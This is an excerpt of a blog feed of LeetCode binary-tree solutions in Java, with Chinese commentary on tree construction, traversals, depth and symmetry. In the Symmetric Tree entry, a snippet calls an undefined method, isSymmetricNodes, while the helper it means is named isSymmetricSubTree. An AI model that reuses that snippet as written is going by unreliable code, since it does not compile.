<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>分析来源于<a href="https://www.cnblogs.com/springfor/p/3884034.html">这里</a>。</p>
<pre>     <span style="color: #ff0000;">1</span>       
    / \   
   <span style="color: #3366ff;">2</span>   <span style="color: #008000;">3</span>   
  / \ / \   
 <span style="color: #3366ff;">4</span>  <span style="color: #3366ff;">5</span> <span style="color: #008000;">6</span><span style="color: #008000;">  7</span></pre>

<p> 对于上图的树来说，</p>
<ul>
<li>index: <u>0 1 2 3 4 5 6</u></li>
<li>先序遍历为<span style="color: #000000;">:</span><span style="color: #ff0000;"> 1</span><span style="color: #3366ff;"> 2 4 5 </span><span style="color: #008000;">3 6 7 </span></li>
<li>中序遍历为<span style="color: #000000;">:</span><span style="color: #3366ff;"> 4 2 5</span><span style="color: red;"> 1 </span><span style="color: #008000;">6 3 7</span></li>
</ul>
<p>红色是根节点，蓝色为左子树，绿色为右子树。可以发现的规律是：</p>
<ol>
<li>先序遍历的从左数第一个为整棵树的根节点。</li>
<li>中序遍历中根节点是左子树右子树的分割点。</li>
</ol>
<p>再看这个树的左子树：</p>
<ul>
<li>先序遍历为<span style="color: #000000;">:</span><span style="color: #ff0000;"> </span><span style="color: #ff0000;">2</span><span style="color: #008000;"> </span><span style="color: #3366ff;">4</span><span style="color: #008000;"> 5</span><span style="color: #008000;"> </span></li>
<li>中序遍历为<span style="color: #000000;">:</span><span style="color: #3366ff;"> 4 </span><span style="color: #ff0000;">2</span><span style="color: #008000;"> </span><span style="color: #3366ff;">5<br></span></li>
</ul>
<p>依然可以套用上面发现的规律。再看这个树的右子树：</p>
<ul>
<li>先序遍历为<span style="color: #000000;">:</span><span style="color: #ff0000;"> </span><span style="color: #ff0000;">3</span><span style="color: #008000;"> </span><span style="color: #3366ff;">6</span><span style="color: #008000;"> 7</span><span style="color: #008000;"> </span></li>
<li>中序遍历为<span style="color: #000000;">:</span><span style="color: #3366ff;"> 6 </span><span style="color: #ff0000;">3</span><span style="color: #008000;"> </span><span style="color: #3366ff;">7<br></span></li>
</ul>
<p>也是可以套用上面的规律的。</p>
<p> 所以这道题可以用递归的方法解决。</p>
<p> 具体解决方法是：</p>
<ul>
<li>通过先序遍历找到第一个点作为根节点，在中序遍历中找到根节点并记录index。</li>
<li>因为中序遍历中根节点左边为左子树，所以可以记录左子树的长度并在先序遍历中依据这个长度找到左子树的区间，用同样方法可以找到右子树的区间。</li>
<li><p>递归的建立左子树和右子树。</p>
<p>代码如下：</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span>[] inorder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preorder.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (preorder.length == <span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">new</span> TreeNode(preorder[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//  通过先序遍历找到根节点</span></span><br><span class="line">    <span class="keyword">int</span> rootVal = preorder[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 在中序遍历中找到根节点并记录index</span></span><br><span class="line">    <span class="keyword">int</span> rootIndex = search(inorder, rootVal);</span><br><span class="line">    <span class="comment">// 建立根节点</span></span><br><span class="line">    TreeNode root = <span class="keyword">new</span> TreeNode(rootVal);</span><br><span class="line">    <span class="comment">// 建立左子树</span></span><br><span class="line">    root.left = buildTree(Arrays.copyOfRange(preorder, <span class="number">1</span>, <span class="number">1</span> + rootIndex),</span><br><span class="line">            Arrays.copyOfRange(inorder, <span class="number">0</span>, rootIndex));</span><br><span class="line">    <span class="comment">//建立右子树</span></span><br><span class="line">    root.right = buildTree(Arrays.copyOfRange(preorder, <span class="number">1</span> + rootIndex, preorder.length),</span><br><span class="line">            Arrays.copyOfRange(inorder, <span class="number">1</span> + rootIndex, inorder.length));</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] inorder, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; inorder.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (inorder[i] == val) <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面反复使用了<code>Arrays.copyOfRange()</code>，大大增加了时间复杂度和空间复杂度。一个优化的方案是，给定数组的上边界和下边界。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span>[] inorder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buildTreeHelper(preorder, <span class="number">0</span>, preorder.length,</span><br><span class="line">            inorder, <span class="number">0</span>, inorder.length);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> TreeNode <span class="title">buildTreeHelper</span><span class="params">(<span class="keyword">int</span> [] preorder, <span class="keyword">int</span> preFrom, <span class="keyword">int</span> preTo,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">int</span> [] inorder, <span class="keyword">int</span> inFrom, <span class="keyword">int</span> inTo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preTo &lt;= preFrom) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//  通过先序遍历找到根节点</span></span><br><span class="line">    <span class="keyword">int</span> rootVal = preorder[preFrom];</span><br><span class="line">    <span class="comment">// 在中序遍历中找到根节点并记录index</span></span><br><span class="line">    <span class="keyword">int</span> rootIndex = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = inFrom; i &lt; inTo; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (inorder[i] == rootVal) &#123;</span><br><span class="line">            rootIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 左子树大小（节点个数）</span></span><br><span class="line">    <span class="keyword">int</span> leftTreeSize = rootIndex - inFrom;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建立根节点</span></span><br><span class="line">    TreeNode root = <span class="keyword">new</span> TreeNode(rootVal);</span><br><span class="line">    <span class="comment">// 建立左子树</span></span><br><span class="line">    root.left = buildTreeHelper(preorder, preFrom + <span class="number">1</span>, preFrom + <span class="number">1</span> + leftTreeSize,</span><br><span class="line">            inorder, inFrom, rootIndex);</span><br><span class="line">    <span class="comment">//建立右子树</span></span><br><span class="line">    root.right = buildTreeHelper(preorder, preFrom + <span class="number">1</span> + leftTreeSize, preTo,</span><br><span class="line">            inorder, rootIndex + <span class="number">1</span>, inTo);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[104. Maximum Depth of Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-104-Maximum-Depth-of-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, find its maximum depth.</p>
<p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p>
<p>Note: A leaf is a node with no children.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Given binary tree [3,9,20,null,null,15,7],</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> left = maxDepth(root.left);</span><br><span class="line">    <span class="keyword">int</span> right = maxDepth(root.right);</span><br><span class="line">    <span class="keyword">return</span> Math.max(left, right) + <span class="number">1</span>;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[103. Binary Tree Zigzag Level Order Traversal]]></title>
      <url>/wiki/2017/10/30/Leetcode-103-Binary-Tree-Zigzag-Level-Order-Traversal/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, return the zigzag level order traversal of its nodes’ values. (ie, from left to right, then right to left for the next level and alternate between).</p>
<p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>return its zigzag level order traversal as:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [20,9],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 102. Binary Tree Level Order Traversal的变形，其实增加一个判断即可，如果是从左往右，那么直接添加；如果是从右往左，那么先反转再添加。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; zigzagLevelOrder(TreeNode root) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; zigzag = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> zigzag;</span><br><span class="line">    <span class="keyword">boolean</span> isLeftToRight = <span class="keyword">true</span>;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.add(root);</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            list.add(node.val);</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="keyword">null</span>) queue.offer(node.left);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="keyword">null</span>) queue.offer(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (isLeftToRight)&#123;</span><br><span class="line">            zigzag.add(list);</span><br><span class="line">            isLeftToRight = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Collections.reverse(list);</span><br><span class="line">            zigzag.add(list);</span><br><span class="line">            isLeftToRight = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> zigzag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[102. Binary Tree Level Order Traversal]]></title>
      <url>/wiki/2017/10/30/Leetcode-102-Binary-Tree-Level-Order-Traversal/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, return the <strong><em>level order</em></strong> traversal of its nodes’ values. (ie, from left to right, level by level).</p>
<p>For example:</p>
<p>Given binary tree <code>[3,9,20,null,null,15,7]</code>,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p>
<p>return its level order traversal as:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [9,20],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目要求的层序遍历。题目这么长，其实想让我们写广度优先搜索。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; levels = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> levels;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        List&lt;Integer&gt; curLevel = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="keyword">null</span>) queue.offer(node.left);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="keyword">null</span>) queue.offer(node.right);</span><br><span class="line">            curLevel.add(node.val);</span><br><span class="line">        &#125;</span><br><span class="line">        levels.add(curLevel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> levels;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过也可以用深度优先搜索写</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    levelHelper(res, root, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelHelper</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; res, TreeNode root, <span class="keyword">int</span> height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (height == res.size()) &#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> LinkedList&lt;Integer&gt;());</span><br><span class="line">    &#125;</span><br><span class="line">    res.get(height).add(root.val);</span><br><span class="line">    levelHelper(res, root.left, height+<span class="number">1</span>);</span><br><span class="line">    levelHelper(res, root.right, height+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Breath-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[101. Symmetric Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-101-Symmetric-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).</p>
<p>For example, this binary tree <code>[1,2,2,3,4,4,3]</code> is symmetric:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line"> / \ / \</span><br><span class="line">3  4 4  3</span><br></pre></td></tr></table></figure>
<p>But the following <code>[1,2,2,null,3,null,3]</code> is not:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">2   2</span><br><span class="line"> \   \</span><br><span class="line"> 3    3</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>Bonus points if you could solve it both recursively and iteratively.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>二叉树对称，iff, 左子树和右子树对称。 那么怎么判断两棵树对称？</p>
<p>两棵树对成，iff</p>
<ul>
<li>左节点和右节点的值相等</li>
<li>两棵树的左子树和右子树依次对称</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetricSubTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">return</span> isSymmetricNodes(root.left, root.right);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSymmetricSubTree</span><span class="params">(TreeNode root1, TreeNode root2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root1 == <span class="keyword">null</span> || root2 ==  <span class="keyword">null</span>) <span class="keyword">return</span> root1 == root2;</span><br><span class="line">    <span class="keyword">return</span> root1.val == root2.val &amp;&amp; </span><br><span class="line">                isSymmetricSubTree(root1.left, root2.right) &amp;&amp;</span><br><span class="line">                isSymmetricSubTree(root1.right, root2.left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>isSymmetricSubTree</code>还可以再优化一点, 也就是将根节点看成是子节点，相当于增加了一个虚拟根节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetricSubTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isSymmetricNodes(root, root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的思路，使用迭代:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    stack.push(root);</span><br><span class="line">    stack.push(root);</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        TreeNode left = stack.pop();</span><br><span class="line">        TreeNode right = stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (left.val != right.val) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (left.left != <span class="keyword">null</span> &amp;&amp; right.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(left.left); stack.push(right.right);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.left != right.right) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (left.right != <span class="keyword">null</span> &amp;&amp; right.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(left.right); stack.push(right.left);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>  (left.right != right.left) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现使用BFS思路的QUEUE，使用迭代可以简化一些：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    q.add(root);</span><br><span class="line">    q.add(root);</span><br><span class="line">    <span class="keyword">while</span> (!q.isEmpty()) &#123;</span><br><span class="line">        TreeNode t1 = q.poll();</span><br><span class="line">        TreeNode t2 = q.poll();</span><br><span class="line">        <span class="keyword">if</span> (t1 == <span class="keyword">null</span> &amp;&amp; t2 == <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (t1 == <span class="keyword">null</span> || t2 == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (t1.val != t2.val) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        q.add(t1.left);</span><br><span class="line">        q.add(t2.right);</span><br><span class="line">        q.add(t1.right);</span><br><span class="line">        q.add(t2.left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breadth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[100. Same Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-100-Same-Tree/</url>
      <content type="html"><![CDATA[<p>Given two binary trees, write a function to check if they are the same or not.</p>
<p>Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</p>
<p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          /           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
